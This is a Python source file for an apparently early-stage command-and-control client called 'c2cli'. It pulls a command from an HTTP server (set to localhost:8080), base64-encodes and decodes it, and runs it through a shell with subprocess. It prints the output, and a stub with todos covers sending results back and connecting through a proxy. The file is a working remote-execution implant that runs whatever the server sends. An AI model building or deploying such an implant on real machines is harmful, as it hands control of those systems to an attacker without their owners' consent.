import base64
from subprocess import check_output as cmd_ouput
import urllib.request


# import request
# Use 'del <module>' to unload a module

# todo: get cmd from c2http
# todo: connect through proxy
# todo: distinguish between OSs for CMD execution


def header():
    print("----------")
    print("  c2cli")
    print("----------")


def get_cmd_from_c2http(url, port):
    # Connect to c2http server and pull/rcv commands
    # HTTP GET method
    target = url + ':' + port
    response = urllib.request.urlopen(target)
    cmds = response.read().decode()
    return cmds


def execute_cmd(cmd):
    # todo: put in simple error handling

    return cmd_ouput(cmd, shell=True)


def send_result_to_c2http():
    # Send encoded results back to server
    # HTTP POST method
    pass


def b64encode(clear_cmd):
    ecmd = base64.b64encode(clear_cmd.encode())
    # print('encoded_cmd fun:: {}'.format(ecmd))
    return ecmd


def b64decode(encoded_cmd):
    dcmd = base64.b64decode(encoded_cmd.decode())
    # print('decode_cmd fun:: {}'.format(dcmd))
    return dcmd


def output_format(output, out_type):
    print('\n----BEGIN OUT :: TYPE: {}----'.format(out_type))
    print(output)
    print('-----END OUT---------------------------------')


def main():
    type_clear = 'clear cmd result  '
    type_encoded = 'encoded cmd result'

    url = 'http://localhost'
    port = '8080'

    header()

    # Get encoded cmd from c2http.py .
    clear_cmd = get_cmd_from_c2http(url, port)  # currently local
    print('CMD from Server:: {}'.format(clear_cmd))

    encoded_cmd = b64encode(clear_cmd)
    print('[+] Encoded CMD is "{}"'.format(encoded_cmd))

    # Decode cmd
    decoded_cmd = b64decode(encoded_cmd)
    print('[+] Decoded CMD is "{}"'.format(decoded_cmd))

    # Execute and return results
    cmdout = execute_cmd(decoded_cmd.decode()).strip()
    output_format(cmdout.decode(), type_clear)

    # Encode Results
    clear_output = cmdout.decode()
    encoded_cmd_output = b64encode(clear_output)
    output_format(encoded_cmd_output, type_encoded)


# todo: send encoded results back to c2http


if __name__ == "__main__":
    main()
